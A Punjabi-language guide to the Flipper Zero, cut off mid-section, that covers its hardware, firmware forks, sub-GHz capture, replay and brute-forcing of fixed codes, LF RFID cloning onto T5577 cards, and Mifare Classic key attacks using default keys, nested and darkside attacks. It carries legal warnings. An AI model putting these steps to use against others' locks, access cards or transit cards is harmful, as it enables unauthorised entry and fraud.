**Flipper Zero** ਹੱਥੀਂ ਸੁਰੱਖਿਆ ਕੰਮ ਕਰਨ ਵਾਲੇ ਭਾਈਚਾਰੇ ਦਾ ਸਭ ਤੋਂ ਮਸ਼ਹੂਰ ਮਲਟੀਟੂਲ ਹੈ। ਇਹ ਜੇਬ ਵਿੱਚ ਆ ਜਾਂਦਾ ਹੈ, ਲਗਭਗ 170 ਡਾਲਰ ਦਾ ਹੈ ਅਤੇ ਇਸ ਵਿੱਚ ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਰੇਡੀਓ, 125 ਕਿਲੋਹਰਟਜ਼ ਆਰਐਫਆਈਡੀ ਰੀਡਰ, ਐਨਐਫਸੀ ਐਂਟੀਨਾ, ਇਨਫਰਾਰੈੱਡ ਟ੍ਰਾਂਸੀਵਰ, iButton ਪੋਰਟ, ਬਲੂਟੁੱਥ ਰੇਡੀਓ, ਜੀਪੀਆਈਓ ਵਿਸਥਾਰ ਹੈਡਰ ਅਤੇ ਯੂਐਸਬੀ ਪੋਰਟ ਹਨ। ਛੋਟੀ ਡਿਵਾਈਸ ਨੂੰ ਚਾਬੀਆਂ ਨਾਲ ਵੀ ਲਟਕਾਇਆ ਜਾ ਸਕਦਾ ਹੈ। ਇਹ ਗਾਈਡ ਡੱਬਾ ਖੋਲ੍ਹਣ ਤੋਂ ਲੈ ਕੇ ਉੱਚ-ਪੱਧਰੀ ਰੈੱਡ-ਟੀਮ ਅਭਿਆਸ ਕੰਮ ਤੱਕ ਦੀਆਂ ਸਮਰੱਥਾਵਾਂ ਸਮਝਾਉਂਦੀ ਹੈ।

*ਜੇ Flipper Zero ਨਵਾਂ ਹੈ ਤਾਂ ਭਾਗ ਕ੍ਰਮ ਨਾਲ ਪੜ੍ਹੋ। ਪਹਿਲਾਂ ਤੋਂ ਵਰਤਦੇ ਹੋ ਤਾਂ ਲੋੜੀਂਦੇ ਉਪ-ਸਿਸਟਮ ਵਾਲੇ ਭਾਗ 'ਤੇ ਜਾਓ।*

## ਹਾਰਡਵੇਅਰ ਦੀ ਜਾਣ-ਪਛਾਣ

**Flipper Zero** ਵਿੱਚ STM32WB55 ਮਾਈਕ੍ਰੋਕੰਟਰੋਲਰ ਹੈ। ਇਹ ਦੋ ਕੋਰਾਂ ਵਾਲੀ Arm Cortex-M4 / Cortex-M0+ ਚਿੱਪ ਹੈ ਜਿਸ ਵਿੱਚ ਬਲੂਟੁੱਥ 5.0 ਰੇਡੀਓ ਜੁੜਿਆ ਹੋਇਆ ਹੈ। ਮੁੱਖ ਐਪ M4 ਕੋਰ 'ਤੇ ਵੱਧ ਤੋਂ ਵੱਧ 64 ਮੇਗਾਹਰਟਜ਼ ਨਾਲ ਚੱਲਦੀ ਹੈ। M0+ ਕੋਰ ਬਲੂਟੁੱਥ ਸਟੈਕ ਸੰਭਾਲਦਾ ਹੈ।

| ਹਿੱਸਾ | ਵੇਰਵਾ |
|---|---|
| **MCU** | STM32WB55RGV6, 64 ਮੇਗਾਹਰਟਜ਼ ਵਾਲਾ Cortex-M4 + Cortex-M0+ |
| **ਫਲੈਸ਼** | 1 MB ਅੰਦਰੂਨੀ + 256 Mbit ਬਾਹਰੀ ਐਸਪੀਆਈ NOR |
| **RAM** | 256 KB SRAM |
| **ਡਿਸਪਲੇ** | 1.4-ਇੰਚ ਈ-ਪੇਪਰ (128x64), ਹਮੇਸ਼ਾ ਚਾਲੂ |
| **ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਰੇਡੀਓ** | CC1101 ਟ੍ਰਾਂਸੀਵਰ, 300–928 ਮੇਗਾਹਰਟਜ਼ |
| **ਆਰਐਫਆਈਡੀ** | 125 ਕਿਲੋਹਰਟਜ਼ ਐਨਾਲੌਗ ਫਰੰਟ-ਐਂਡ (EM4100, ਐਚਆਈਡੀ, Indala ਅਤੇ ਹੋਰ) |
| **ਐਨਐਫਸੀ** | ST25R3916B, 13.56 ਮੇਗਾਹਰਟਜ਼ ISO 14443A/B, 15693 |
| **ਇਨਫਰਾਰੈੱਡ** | 940 nm ਭੇਜਣ ਵਾਲੀ ਐਲਈਡੀ + TSOP75338 ਪ੍ਰਾਪਤ ਕਰਨ ਵਾਲਾ ਸੈਂਸਰ |
| **iButton** | 1-Wire ਇੰਟਰਫੇਸ, DS1990A ਅਤੇ ਸਪਰਸ਼-ਮੈਮੋਰੀ ਕੁੰਜੀ |
| **ਬਲੂਟੁੱਥ** | ਬੀਐਲਈ 5.0 (STM32WB55 ਵਿੱਚ ਜੁੜਿਆ ਹੋਇਆ) |
| **ਜੀਪੀਆਈਓ** | 18-ਪਿੰਨ ਹੈਡਰ: ਐਸਪੀਆਈ, ਆਈ੨ਸੀ, ਯੂਆਰਟੀ, 5V/3.3V ਪਾਵਰ, ADC |
| **ਯੂਐਸਬੀ** | ਯੂਐਸਬੀ-C, ਐਚਆਈਡੀ ਡਿਵਾਈਸ ਸਹਾਇਤਾ (BadUSB / ਯੂ੨ਐਫ) |
| **ਬੈਟਰੀ** | 2000 mAh ਲਿਥੀਅਮ-ਪਾਲੀਮਰ, ਯੂਐਸਬੀ-C ਚਾਰਜਿੰਗ, ਆਮ ਵਰਤੋਂ ਵਿੱਚ ਲਗਭਗ 30 ਘੰਟੇ |
| **MicroSD** | 128 GB ਤੱਕ, FAT32 ਜਾਂ exFAT |

**ਈ-ਪੇਪਰ ਡਿਸਪਲੇ** ਠਹਿਰੀ ਤਸਵੀਰ ਦਿਖਾਉਂਦੇ ਸਮੇਂ ਬਿਜਲੀ ਨਹੀਂ ਲੈਂਦੀ। ਇਸ ਕਰਕੇ ਲਗਾਤਾਰ ਉਡੀਕ ਅਵਸਥਾ ਵਿੱਚ ਬੈਟਰੀ ਲੰਮਾ ਸਮਾਂ ਚੱਲਦੀ ਹੈ।

**CC1101** Texas Instruments ਦੀ ਆਮ ਵਰਤੋਂ ਵਾਲੀ ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਟ੍ਰਾਂਸੀਵਰ ਚਿੱਪ ਹੈ। ਇਹ 300–348 ਮੇਗਾਹਰਟਜ਼, 387–464 ਮੇਗਾਹਰਟਜ਼ ਅਤੇ 779–928 ਮੇਗਾਹਰਟਜ਼ ਰੇਂਜ ਕਵਰ ਕਰਦੀ ਹੈ। ਇਸਨੂੰ ਪ੍ਰੋਗਰਾਮ ਕੀਤਾ ਜਾ ਸਕਦਾ ਹੈ, ਇਸ ਲਈ ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਮੋਡੀਊਲ ਲਚਕਦਾਰ ਹੈ।

## ਫਰਮਵੇਅਰ ਦੇ ਵਿਕਲਪ

ਤੁਸੀਂ **ਅਧਿਕਾਰਤ Flipper Zero ਫਰਮਵੇਅਰ** ਜਾਂ ਕਈ ਮਸ਼ਹੂਰ ਭਾਈਚਾਰਾ ਸ਼ਾਖਾ ਚਲਾ ਸਕਦੇ ਹੋ। ਨਿਯਮਕ ਅਤੇ ਕਾਨੂੰਨੀ ਕਾਰਨਾਂ ਕਰਕੇ Flipper ਯੰਤਰ ਜਿਨ੍ਹਾਂ ਫੀਚਰਾਂ 'ਤੇ ਹੱਦ ਲਾਉਂਦਾ ਹੈ, ਕੁਝ ਸ਼ਾਖਾ ਉਹ ਖੋਲ੍ਹ ਦਿੰਦੇ ਹਨ।

| ਫਰਮਵੇਅਰ | ਵੇਰਵਾ | ਮੁੱਖ ਫੀਚਰ |
|---|---|---|
| **ਅਧਿਕਾਰਤ** | Flipper ਯੰਤਰ ਦਾ ਅਸਲ ਫਰਮਵੇਅਰ | ਸੰਭਲ ਕੇ ਰੱਖੀਆਂ ਸੁਰੱਖਿਅਤ ਡਿਫਾਲਟ ਸੈਟਿੰਗਾਂ |
| **Unleashed** | ਸਥਿਰਤਾ 'ਤੇ ਧਿਆਨ ਵਾਲਾ ਮਸ਼ਹੂਰ ਸ਼ਾਖਾ | ਸਾਰੀਆਂ ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਫ੍ਰੀਕਵੈਂਸੀਆਂ ਅਤੇ ਹੋਰ ਪ੍ਰੋਟੋਕੋਲ |
| **Xtreme** | ਕਈ ਫੀਚਰ, ਸਰਗਰਮ ਰੱਖ-ਰਖਾਅ | ਆਪਣੀ UI, ਹੋਰ ਐਪਾਂ, ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਵਿਕਲਪ |
| **RogueMaster** | ਤੀਜੀ ਧਿਰ ਦੀਆਂ ਕਈ ਐਪਾਂ ਨਾਲ | ਸ਼ੁਰੂ ਤੋਂ ਵੱਡਾ ਐਪ ਪੈਕੇਜ |

ਖਿੜਕੀ, macOS ਜਾਂ Linux 'ਤੇ **qFlipper ਡੈਸਕਟਾਪ ਐਪ** ਰਾਹੀਂ ਕੋਈ ਵੀ ਸ਼ਾਖਾ ਫਲੈਸ਼ ਕਰੋ। ਜਾਂ `.dfu` ਫਾਈਲ SD ਕਾਰਡ ਵਿੱਚ ਨਕਲ ਕਰਕੇ ਡਿਵਾਈਸ ਦਾ ਅੱਪਡੇਟ ਮੀਨੂ ਵਰਤੋ।

*ਖੋਜ ਲਈ Unleashed ਸੰਭਲਿਆ ਹੋਇਆ ਸ਼ੁਰੂਆਤੀ ਵਿਕਲਪ ਹੈ। ਵੱਧ ਫੀਚਰ ਚਾਹੁਣ ਵਾਲੇ Xtreme ਲੈਂਦੇ ਹਨ। ਯਾਤਰਾ ਸਮੇਂ ਕਾਨੂੰਨੀ ਮੁਸ਼ਕਲ ਘਟਾਉਣ ਲਈ ਅਧਿਕਾਰਤ ਫਰਮਵੇਅਰ ਚਲਾਓ।*

## ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਰੇਡੀਓ

ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਮੋਡੀਊਲ ਸਭ ਤੋਂ ਵੱਧ ਚਰਚਿਤ ਵਿਸ਼ੇਸ਼ਤਾਵਾਂ ਵਿੱਚੋਂ ਇੱਕ ਹੈ। ਇਹ ਗੈਰਾਜ ਦੇ ਦਰਵਾਜ਼ਿਆਂ, ਕਾਰ ਦੇ ਰਿਮੋਟ, ਦਰਵਾਜ਼ੇ ਦੀਆਂ ਘੰਟੀਆਂ, ਬੇਤਾਰ ਮੌਸਮ ਕੇਂਦਰਾਂ, ਬਿਜਲੀ ਦੇ ਸਾਕਟਾਂ ਅਤੇ ਹੋਰ ਕਈ ਯੰਤਰਾਂ ਵੱਲੋਂ ਵਰਤੀਆਂ ਜਾਂਦੀਆਂ ਆਵ੍ਰਿਤੀਆਂ ਉੱਤੇ ਸੰਕੇਤ ਦਰਜ, ਵਿਸ਼ਲੇਸ਼ਣ ਅਤੇ ਮੁੜ ਪ੍ਰਸਾਰਿਤ ਕਰਦਾ ਹੈ।

### ਸਹਾਇਕ ਫ੍ਰੀਕਵੈਂਸੀ ਰੇਂਜ

- **300–348 ਮੇਗਾਹਰਟਜ਼** — ਪੁਰਾਣੇ ਰਿਮੋਟ ਅਤੇ ਅਮਰੀਕਾ ਦੇ ਕੁਝ ਗੈਰਾਜ-ਦਰਵਾਜ਼ਾ ਸਿਸਟਮ
- **387–464 ਮੇਗਾਹਰਟਜ਼** — ਯੂਰਪ ਅਤੇ ਅਮਰੀਕਾ ਦੇ ਡਿਵਾਈਸ; 433.92 ਮੇਗਾਹਰਟਜ਼ ਸਭ ਤੋਂ ਆਮ ਵਿਸ਼ਵਵਿਆਪੀ ਆਈਐਸਐਮ ਬੈਂਡ ਹੈ
- **779–928 ਮੇਗਾਹਰਟਜ਼** — 868 ਮੇਗਾਹਰਟਜ਼ (ਯੂਰਪ), 915 ਮੇਗਾਹਰਟਜ਼ (ਅਮਰੀਕੀ ਆਈਐਸਐਮ), 868 ਮੇਗਾਹਰਟਜ਼ LoRa

### ਆਮ ਮੋਡੂਲੇਸ਼ਨ ਤਰੀਕੇ

| Modulation | ਮਤਲਬ |
|---|---|
| **AM (ASK/OOK)** | ਆਯਾਮ ਬਦਲਾਅ ਕੁੰਜੀਕਰਨ; ਸੌਖਾ ਚਾਲੂ/ਬੰਦ ਸੰਕੇਤ, ਆਮ ਰਿਮੋਟ ਵਿੱਚ ਵਰਤਿਆ ਜਾਂਦਾ ਹੈ। |
| **FM (FSK/2-FSK)** | ਆਵ੍ਰਿਤੀ ਬਦਲਾਅ ਕੁੰਜੀਕਰਨ; ਮੌਸਮ ਸਟੇਸ਼ਨਾਂ ਅਤੇ ਕੁਝ ਕਾਰ ਰਿਮੋਟ ਵਿੱਚ। |
| **APSK** | ਮਿਲਿਆ-ਜੁਲਿਆ ਤਰੀਕਾ; ਥੋੜ੍ਹੇ ਸਮਾਰਟ ਡਿਵਾਈਸਾਂ ਵਿੱਚ। |

Flipper ਕੱਚੇ OOK ਸਿਗਨਲਾਂ ਦਾ ਆਪਣੇ ਆਪ ਭੇਦ ਖੋਲ੍ਹਦਾ ਹੈ। ਇਹ ਉਹਨਾਂ ਨੂੰ ਪਰਦੇ 'ਤੇ ਦਿਖਾਉਂਦਾ ਅਤੇ ਇੱਕ ਬਟਨ ਨਾਲ ਮੁੜ ਭੇਜਣ ਦਿੰਦਾ ਹੈ। ਜਿਨ੍ਹਾਂ ਯੰਤਰਾਂ ਵਿੱਚ ਬਦਲਦੇ ਕੋਡ ਨਹੀਂ ਹੁੰਦੇ, ਉਨ੍ਹਾਂ ਦੇ **ਸਥਿਰ ਕੋਡ ਮੁੜ ਚਲਾਉਣੇ** ਸੌਖੇ ਹਨ।

### ਰੋਲਿੰਗ ਕੋਡ ਅਤੇ ਸਥਿਰ ਕੋਡ

**ਸਥਿਰ ਕੋਡ ਵਾਲੇ** ਯੰਤਰ ਹਰ ਵਾਰ ਉਹੀ ਸੰਕੇਤ ਭੇਜਦੇ ਹਨ। Flipper Zero ਇਸਨੂੰ ਇੱਕ ਵਾਰ ਦਰਜ ਕਰਕੇ ਬਾਅਦ ਵਿੱਚ ਮੁੜ ਭੇਜ ਸਕਦਾ ਹੈ। ਕਈ ਸਸਤੇ ਬੇਤਾਰ ਬਿਜਲੀ-ਸਾਕਟ, ਦਰਵਾਜ਼ੇ ਦੀਆਂ ਘੰਟੀਆਂ ਅਤੇ ਪੁਰਾਣੇ ਗੈਰਾਜ ਦਰਵਾਜ਼ੇ ਸਥਿਰ ਕੋਡ ਵਰਤਦੇ ਹਨ।

**ਬਦਲਦੇ ਕੋਡ ਵਾਲੇ** ਯੰਤਰ (KeeLoq, AUT64 ਆਦਿ) ਹਰ ਵਰਤੋਂ ਮਗਰੋਂ ਕੋਡ ਬਦਲਦੇ ਹਨ। ਫੜੇ ਸੰਕੇਤ ਨੂੰ ਸਿੱਧਾ ਮੁੜ ਭੇਜਿਆ ਨਹੀਂ ਜਾ ਸਕਦਾ। ਇਹਨਾਂ ਸਿਸਟਮਾਂ ਦੀ ਜਾਂਚ ਔਖੀ ਹੁੰਦੀ ਹੈ ਅਤੇ ਖ਼ਾਸ ਸੰਦਾਂ ਤੇ ਸਹੀ ਸਮੇਂ ਦੀ ਨੇੜਤਾ ਚਾਹੀਦੀ ਹੈ। Flipper Zero ਆਧੁਨਿਕ ਬਦਲਦੇ ਕੋਡਾਂ ਨੂੰ ਆਪਣੇ ਆਪ ਨਹੀਂ ਤੋੜ ਸਕਦਾ।

*ਸਿਰਫ਼ ਆਪਣੇ ਡਿਵਾਈਸਾਂ ਦੀ ਜਾਂਚ ਕਰੋ। ਘਰ ਦੇ ਸਥਿਰ-ਕੋਡ ਡਿਵਾਈਸ ਸਿੱਖਣ ਲਈ ਵਧੀਆ ਨਿਸ਼ਾਨਾ ਹਨ।*

### ਸਬ-ਗੀਗਾਹਰਟਜ਼ ਕੰਮ ਕਰਨ ਦਾ ਤਰੀਕਾ

1. ਮੁੱਖ ਮੀਨੂ ਤੋਂ **ਸਬ-ਗੀਗਾਹਰਟਜ਼** ਖੋਲ੍ਹੋ।
2. ਸਿਗਨਲ ਲੈਣ ਲਈ **Read** (ਸੰਕੇਤ ਪੜ੍ਹੋ) ਚੁਣੋ। ਡਿਵਾਈਸ ਰਿਮੋਟ ਵੱਲ ਰੱਖੋ ਅਤੇ ਰਿਮੋਟ ਦਾ ਬਟਨ ਦਬਾਓ।
3. Flipper ਆਵ੍ਰਿਤੀ, ਮਾਡੂਲੇਸ਼ਨ ਅਤੇ ਬਿੱਟਾਂ ਦਾ ਮੂਲ ਨਮੂਨਾ ਦਿਖਾਏਗਾ।
4. SD ਕਾਰਡ 'ਤੇ ਰੱਖਣ ਲਈ **Save** (ਸੰਭਾਲੋ) ਦਬਾਓ।
5. ਫਿਰ ਭੇਜਣ ਲਈ **Send** (ਮੁੜ ਭੇਜੋ) ਦਬਾਓ ਜਾਂ ਬਾਅਦ ਵਿੱਚ ਸੰਭਾਲਿਆ ਫਾਈਲ ਖੋਲ੍ਹੋ।

**Frequency Analyzer** (ਆਵ੍ਰਿਤੀ ਵਿਸ਼ਲੇਸ਼ਕ) ਬਿਨਾਂ ਸੰਕੇਤ ਭੇਜੇ ਰੇਡੀਓ-ਸਪੈਕਟ੍ਰਮ ਦੀ ਜਾਂਚ ਕਰਕੇ ਸਰਗਰਮ ਆਵ੍ਰਿਤੀਆਂ ਦਿਖਾਉਂਦਾ ਹੈ। ਇਸ ਨਾਲ ਅਣਜਾਣ ਟ੍ਰਾਂਸਮੀਟਰ ਲੱਭੇ ਜਾ ਸਕਦੇ ਹਨ।

### ਬਰੂਟ-ਫੋਰਸ ਜਾਂਚ

ਛੋਟੇ ਕੁੰਜੀ-ਖੇਤਰ ਵਾਲੇ ਪ੍ਰੋਟੋਕੋਲਾਂ ਲਈ, ਜਿਵੇਂ 12-ਬਿੱਟ ਜਾਂ 24-ਬਿੱਟ ਸਥਿਰ ਕੋਡ ਵਾਲੇ ਪੁਰਾਣੇ ਰਿਮੋਟ, Flipper ਹਰ ਸੰਭਵ ਕੋਡ ਅਜ਼ਮਾਉਣ ਦਾ **ਪੂਰੀ ਖੋਜ ਵਾਲਾ ਕ੍ਰਮ** ਚਲਾ ਸਕਦਾ ਹੈ। ਇਹ ਬਹੁਤ ਪੁਰਾਣੇ ਜਾਂ ਸਸਤੇ ਯੰਤਰਾਂ 'ਤੇ ਕੰਮ ਕਰ ਸਕਦਾ ਹੈ, ਪਰ ਬਦਲਦੇ ਕੋਡਾਂ ਜਾਂ ਵੱਡੇ ਕੁੰਜੀ-ਖੇਤਰਾਂ 'ਤੇ ਨਹੀਂ।

ਕਸਟਮ ਫਰਮਵੇਅਰ ਵਿੱਚ ਵਾਧੂ ਆਮ ਕੁੰਜੀ-ਸੂਚੀਆਂ ਅਤੇ ਕੁਝ ਨਿਰਮਾਤਾਵਾਂ ਲਈ ਖ਼ਾਸ ਕੋਡ-ਕ੍ਰਮ ਹੁੰਦੇ ਹਨ। ਆਮ ਕ੍ਰਮਾਂ ਵਿੱਚ **Came 12bit**, **Nice 12bit**, **Linear 8bit** ਅਤੇ **Holtek 12bit** ਹਨ।

## ਆਰਐਫਆਈਡੀ (125 ਕਿਲੋਹਰਟਜ਼ ਘੱਟ ਫ੍ਰੀਕਵੈਂਸੀ)

### LF ਕਾਰਡ ਪੜ੍ਹਨਾ

Flipper ਦੇ ਐਂਟੀਨਾ ਵਾਲੇ ਉੱਪਰਲੇ ਕਿਨਾਰੇ ਨੂੰ ਕਾਰਡ ਜਾਂ ਕੀ-ਫੋਬ ਤੋਂ ਕੁਝ ਸੈਂਟੀਮੀਟਰ ਦੂਰ ਰੱਖੋ। **125 kHz RFID > Read** (ਆਰਐਫਆਈਡੀ ਕਾਰਡ ਪੜ੍ਹਨ ਦਾ ਮਾਰਗ) ਮੀਨੂ ਖੋਲ੍ਹੋ। Read (ਪੜ੍ਹੋ) ਚੋਣ LF ਕਾਰਡ ਪੜ੍ਹ ਕੇ ਉਸਦੀ ID ਦਿਖਾਉਂਦੀ ਹੈ। ਯੰਤਰ ਇੱਕ ਜਾਂ ਦੋ ਸਕਿੰਟਾਂ ਵਿੱਚ ID ਪੜ੍ਹ ਕੇ ਸਹੂਲਤ ਕੋਡ ਅਤੇ ਕਾਰਡ ਨੰਬਰ ਦਿਖਾਉਂਦਾ ਹੈ।

### ਨਕਲ ਅਤੇ ਕਲੋਨ ਕਰਨਾ

ਕਾਰਡ ਪੜ੍ਹਨ ਮਗਰੋਂ ਇਸਨੂੰ ਫਾਈਲ ਵਿੱਚ ਸੰਭਾਲੋ। ਬਾਅਦ ਵਿੱਚ ਉਹ ਫਾਈਲ ਚੁਣ ਕੇ ਬਟਨ ਦਬਾਓ ਤਾਂ Flipper ਕਾਰਡ ਦੀ **ਨਕਲ** ਕਰਦਾ ਹੈ। Flipper ਕਾਰਡ ID ਭੇਜਦਾ ਹੈ, ਜਿਸ ਨਾਲ ਪਾਠਕ ਇਸਨੂੰ ਅਸਲ ਕਾਰਡ ਵਾਂਗ ਪਛਾਣਦਾ ਹੈ।

ਖਾਲੀ T5577 ਲਿਖਣ-ਯੋਗ ਕਾਰਡ ਉੱਤੇ ID ਵੀ **ਲਿਖੀ** ਜਾ ਸਕਦੀ ਹੈ। ਇਹ ਲਗਭਗ $0.50 ਦਾ ਹੁੰਦਾ ਹੈ ਅਤੇ ਬਹੁਤੇ ਘੱਟ-ਆਵ੍ਰਿਤੀ ਫਾਰਮੈਟਾਂ ਨੂੰ ਸਹਾਇਕ ਕਰਦਾ ਹੈ।

*ਆਪਣਾ ਨਾ ਹੋਣ ਵਾਲਾ ਜਾਂ ਜਿਸਦੀ ਜਾਂਚ ਦੀ ਇਜਾਜ਼ਤ ਨਾ ਹੋਵੇ, ਅਜਿਹਾ ਪਹੁੰਚ-ਕਾਰਡ ਨਕਲ ਕਰਨਾ ਬਹੁਤੀਆਂ ਥਾਵਾਂ ਉੱਤੇ ਅਪਰਾਧ ਹੈ। ਪਹੁੰਚ-ਨਿਯੰਤਰਣ ਸਿਸਟਮ ਦੀ ਜਾਂਚ ਤੋਂ ਪਹਿਲਾਂ ਲਿਖਤੀ ਇਜਾਜ਼ਤ ਲਵੋ.*

### LF ਆਰਐਫਆਈਡੀ ਦੀਆਂ ਹੱਦਾਂ

ਘੱਟ-ਆਵ੍ਰਿਤੀ ਆਰਐਫਆਈਡੀ ਵਿੱਚ ਕ੍ਰਿਪਟੋਗ੍ਰਾਫਿਕ ਸੁਰੱਖਿਆ ਨਹੀਂ ਹੁੰਦੀ। ਨੇੜੇ ਪਾਠਕ ਰੱਖਣ ਵਾਲਾ ਕੋਈ ਵੀ ਵਿਅਕਤੀ ਤੁਹਾਡੀ ਕਾਰਡ ID ਪੜ੍ਹ ਸਕਦਾ ਹੈ। ਆਧੁਨਿਕ ਭੌਤਿਕ ਸੁਰੱਖਿਆ ਵਿੱਚ ਆਪਸੀ ਪ੍ਰਮਾਣੀਕਰਨ ਵਾਲੇ ਉੱਚ-ਆਵ੍ਰਿਤੀ 13.56 ਮੇਗਾਹਰਟਜ਼ ਐਨਐਫਸੀ ਸਮਾਰਟ ਕਾਰਡ ਵਰਤੇ ਜਾਂਦੇ ਹਨ।

## ਐਨਐਫਸੀ (13.56 ਮੇਗਾਹਰਟਜ਼ ਉੱਚ ਫ੍ਰੀਕਵੈਂਸੀ)

### Mifare Classic ਹਮਲੇ

**Mifare Classic** 13.56 ਮੇਗਾਹਰਟਜ਼ ਸਮਾਰਟ-ਕਾਰਡ ਮਿਆਰ ਹੈ, ਜਿਸਦੀ ਕਮਜ਼ੋਰੀ 2008 ਵਿੱਚ ਸਿਧਾਂਤਕ ਤੌਰ 'ਤੇ ਦਿਖਾਈ ਗਈ ਸੀ। ਪੁਰਾਣੇ ਆਵਾਜਾਈ ਅਤੇ ਇਮਾਰਤਾਂ ਦੇ ਪਹੁੰਚ-ਨਿਯੰਤਰਣ ਸਿਸਟਮ ਅਜੇ ਵੀ ਇਸਨੂੰ ਵਰਤਦੇ ਹਨ। Flipper Zero ਵਿੱਚ ਕਈ ਜਾਂਚ ਤਰੀਕੇ ਹਨ:

- **Read** (ਪੜ੍ਹੋ) — ਕਾਰਖਾਨੇ ਦੀ ਮੂਲ ਕੁੰਜੀ (`FFFFFFFFFFFF` ਜਾਂ `A0A1A2A3A4A5`) ਵਾਲੇ ਸੈਕਟਰ ਪੜ੍ਹਦਾ ਹੈ।
- **ਕੁੰਜੀ-ਸੂਚੀ ਜਾਂਚ** — ਸੁਰੱਖਿਅਤ ਸੈਕਟਰਾਂ ਉੱਤੇ ਆਮ ਕੁੰਜੀਆਂ ਅਜ਼ਮਾਉਂਦੀ ਹੈ; ਕਸਟਮ ਫਰਮਵੇਅਰ ਵਿੱਚ ਵੱਡੀਆਂ ਕੁੰਜੀ-ਸੂਚੀਆਂ ਹੁੰਦੀਆਂ ਹਨ।
- **Nested ਹਮਲਾ** — ਘੱਟੋ-ਘੱਟ ਇੱਕ ਸੈਕਟਰ ਦੀ ਕੁੰਜੀ ਪਤਾ ਹੋਣੀ ਚਾਹੀਦੀ ਹੈ; ਸਮੇਂ ਦੇ ਆਧਾਰ 'ਤੇ ਕ੍ਰਿਪਟੋ-ਵਿਸ਼ਲੇਸ਼ਣ ਕਰਕੇ ਹੋਰ ਕੁੰਜੀਆਂ ਲੱਭੀਆਂ ਜਾਂਦੀਆਂ ਹਨ।
- **Darkside ਹਮਲਾ** — Mifare Classic ਦੇ ਕੁਝ ਸੰਸਕਰਣਾਂ 'ਤੇ ਬਿਨਾਂ ਜਾਣੀ ਕੁੰਜੀ ਦੇ ਵੀ ਕੰਮ ਕਰਦਾ ਹੈ। Flipper ਨੂੰ ਕਾਰਡ ਤੋਂ ਇੱਕ ਸੈਂਟੀਮੀਟਰ ਦੇ ਅੰਦਰ ਰੱਖਣਾ ਪੈਂਦਾ ਹੈ।

ਸਾਰੇ ਸੈਕਟਰ ਪੜ੍ਹਨ ਮਗਰੋਂ ਪੂਰਾ ਡੰਪ ਸੰਭਾਲ ਕੇ ਕਾਰਡ ਦੀ **ਨਕਲ** ਕੀਤੀ ਜਾ ਸਕਦੀ ਹੈ। ਇਸ ਵਿੱਚ ਸੈਕਟਰਾਂ ਦਾ ਡਾਟਾ ਵੀ ਸ਼ਾਮਲ ਹੁੰਦਾ ਹੈ.

*ਯਾਤਰਾ ਕਿਰਾਇਆ ਜਾਂ ਪਾਰਕਿੰਗ ਕ੍ਰੈਡਿਟ ਵਾਲੇ Mifare Classic ਕਾਰਡ ਦੀ ਨਕਲ ਨਾ ਕਰੋ, ਜਦ ਤੱਕ ਕਾਰਡ ਅਤੇ ਉਸ ਨਾਲ ਜੁੜੀ ਬੈਕਐਂਡ ਵਿਵਸਥਾ ਦੋਵੇਂ ਤੁਹਾਡੇ ਕਾਬੂ ਵਿੱਚ ਨਾ ਹੋਣ.*

### Mifare DESfire ਅਤੇ ਆਧੁਨਿਕ ਕਾਰਡ

**Mifare DESfire EV1/EV2/EV3** ਕਾਰਡ AES-128 ਇਨਕ੍ਰਿਪਸ਼ਨ ਅਤੇ ਆਪਸੀ ਪ੍ਰਮਾਣੀਕਰਨ ਵਰਤਦੇ ਹਨ। Flipper Zero ਉਨ੍ਹਾਂ ਦਾ ਸੁਰੱਖਿਅਤ ਡਾਟਾ ਨਹੀਂ ਪੜ੍ਹ ਸਕਦਾ। ਇਹ UID ਅਤੇ AID ਸੂਚੀ ਪੜ੍ਹ ਸਕਦਾ ਹੈ, ਪਰ ਸਹੀ ਕੁੰਜੀ ਤੋਂ ਬਿਨਾਂ ਐਪਲੀਕੇਸ਼ਨ ਡਾਟੇ ਤੱਕ ਪਹੁੰਚ ਨਹੀਂ ਕਰ ਸਕਦਾ। ਇਹੀ ਸਹੀ ਹੈ; DESfire ਸੁਰੱਖਿਅਤ ਹੈ।

**EMV ਭੁਗਤਾਨ ਕਾਰਡ** — ਸੰਪਰਕ-ਰਹਿਤ Visa, Mastercard ਅਤੇ Amex — ਕੁਝ ਜਨਤਕ ਕਾਰਡ-ਵੇਰਵੇ ਦਿਖਾ ਸਕਦੇ ਹਨ (ਪੁਰਾਣੇ ਕਾਰਡਾਂ ਦਾ ਨੰਬਰ, ਮਿਆਦ ਖ਼ਤਮ ਹੋਣ ਦੀ ਤਾਰੀਖ ਅਤੇ ਲੈਣ-ਦੇਣ ਦੀ ਸੂਚੀ)। ਆਧੁਨਿਕ ਕਾਰਡ ਆਮ ਪੜ੍ਹਤ ਦੌਰਾਨ ਘੱਟ ਜਾਣਕਾਰੀ ਦਿੰਦੇ ਹਨ। Flipper ਅਸਲ ਭੁਗਤਾਨ ਸ਼ੁਰੂ ਨਹੀਂ ਕਰ ਸਕਦਾ ਅਤੇ ਨਾ ਹੀ ਭੁਗਤਾਨ-ਸੰਚਾਰ ਨੂੰ ਵਿਚਕਾਰੋਂ ਰੋਕ ਸਕਦਾ ਹੈ।

### ਐਨਐਫਸੀ ਟੈਗ ਅਤੇ NDEF

**NDEF (ਐਨਐਫਸੀ ਡਾਟਾ ਅਦਲਾ-ਬਦਲੀ ਫਾਰਮੈਟ)** ਮਾਰਕੀਟਿੰਗ, ਉਤਪਾਦ ਪ੍ਰਮਾਣੀਕਰਨ ਅਤੇ ਸਮਾਰਟ ਲੇਬਲਾਂ ਵਿੱਚ ਵਰਤੇ ਜਾਂਦੇ ਐਨਐਫਸੀ ਟੈਗਾਂ ਦਾ ਮਿਆਰੀ ਫਾਰਮੈਟ ਹੈ। Flipper NDEF ਟੈਗ ਪੜ੍ਹ, ਸੰਭਾਲ, ਲਿਖ ਅਤੇ ਨਕਲ ਕਰ ਸਕਦਾ ਹੈ। ਇਸਦੇ ਵਰਤੋਂ-ਮਾਮਲੇ:

